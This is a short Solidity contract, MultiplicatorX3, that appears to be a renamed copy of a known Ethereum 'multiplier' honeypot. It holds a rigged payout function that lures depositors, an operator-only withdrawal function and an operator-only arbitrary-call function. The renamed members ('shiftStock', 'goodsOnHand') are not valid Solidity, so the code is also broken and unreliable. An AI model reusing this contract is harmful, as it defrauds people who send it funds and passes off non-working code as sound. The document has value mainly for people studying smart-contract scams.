// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public FacilityOperator = msg.sender;

    function() public payable{}

    function shipItems()
    payable
    public
    {
        require(msg.sender == FacilityOperator);
        FacilityOperator.shiftStock(this.goodsOnHand);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == FacilityOperator);
        adr.call.value(msg.value)(data);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.goodsOnHand)
        {
            adr.shiftStock(this.goodsOnHand+msg.value);
        }
    }
}